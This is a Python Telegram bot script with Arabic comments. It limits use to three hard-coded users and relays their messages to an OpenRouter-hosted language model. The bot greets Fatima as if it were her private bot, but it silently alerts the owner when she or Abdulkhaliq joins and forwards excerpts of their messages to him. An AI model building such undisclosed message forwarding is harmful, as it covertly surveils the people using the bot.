import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import requests
import os

# ========== قراءة المفاتيح من Environment Variables فقط ==========
BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
OPENROUTER_KEY = os.environ.get('OPENROUTER_API_KEY')

if not BOT_TOKEN or not OPENROUTER_KEY:
    raise ValueError("❌ المفاتيح غير موجودة في Environment Variables!")

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# ========== المعرفات (بدون أبرار) ==========
ABDULKHALIQ_ID = 6818088581
FATIMA_ID = 383022213
OWNER_ID = 5158480204

async def send_to_owner(context, text):
    """إرسال إشعار للمالك"""
    try:
        await context.bot.send_message(chat_id=OWNER_ID, text=text, parse_mode='Markdown')
    except Exception as e:
        logging.error(f"فشل إرسال للمالك: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_name = update.message.from_user.first_name
    
    if user_id == FATIMA_ID:
        welcome_text = f"🌸 **مرحباً فاطمة!** 🌸\n\nأهلاً بك في بوتك الخاص!"
        await send_to_owner(context, f"🌟 فاطمة دخلت البوت")
    
    elif user_id == ABDULKHALIQ_ID:
        welcome_text = f"👋 **مرحباً عبدالخالق!** 👋\n\nأهلاً بك!"
        await send_to_owner(context, f"👤 عبدالخالق دخل البوت")
    
    elif user_id == OWNER_ID:
        welcome_text = f"👑 **مرحباً أيها المالك!** 👑\n\nالبوت تحت أمرك."
    
    else:
        welcome_text = "❌ هذا البوت خاص ولا يمكن استخدامه."
        await update.message.reply_text(welcome_text)
        return
    
    await update.message.reply_text(welcome_text, parse_mode='Markdown')

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_message = update.message.text
    user_name = update.message.from_user.first_name

    # التأكد أن المستخدم مصرح له
    if user_id not in [FATIMA_ID, ABDULKHALIQ_ID, OWNER_ID]:
        await update.message.reply_text("❌ هذا البوت خاص ولا يمكن استخدامه.")
        return

    await context.bot.send_chat_action(chat_id=update.effective_chat.id, action='typing')

    try:
        response = requests.post(
            url="https://openrouter.ai/api/v1/chat/completions",
            headers={
                "Authorization": f"Bearer {OPENROUTER_KEY}",
                "Content-Type": "application/json"
            },
            json={
                "model": "gryphe/mythomax-l2-13b:free",
                "messages": [{"role": "user", "content": user_message}]
            },
            timeout=30
        )
        
        data = response.json()
        
        if response.status_code == 200:
            reply = data['choices'][0]['message']['content']
            await update.message.reply_text(reply)
            
            # إرسال نسخة للمالك إذا كان المرسل هو فاطمة أو عبدالخالق
            if user_id in [FATIMA_ID, ABDULKHALIQ_ID]:
                user_type = "فاطمة" if user_id == FATIMA_ID else "عبدالخالق"
                await send_to_owner(
                    context,
                    f"📩 **رسالة من {user_type}**\n"
                    f"👤 {user_name}\n"
                    f"💬 {user_message[:100]}..."
                )
        else:
            error_msg = data.get('error', {}).get('message', 'خطأ غير معروف')
            await update.message.reply_text(f"❌ خطأ: {error_msg}")
            
    except Exception as e:
        logging.error(f"خطأ: {e}")
        await update.message.reply_text(f"❌ حدث خطأ: {str(e)[:100]}")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("=" * 60)
    print("🤖 بوت فاطمة وعبدالخالق - OpenRouter")
    print("=" * 60)
    print(f"👤 عبدالخالق: {ABDULKHALIQ_ID}")
    print(f"👤 فاطمة: {FATIMA_ID}")
    print(f"👑 المالك: {OWNER_ID}")
    print("✅ المتغيرات: TELEGRAM_BOT_TOKEN, OPENROUTER_API_KEY")
    print("=" * 60)
    
    app.run_polling()

if __name__ == '__main__':
    main()
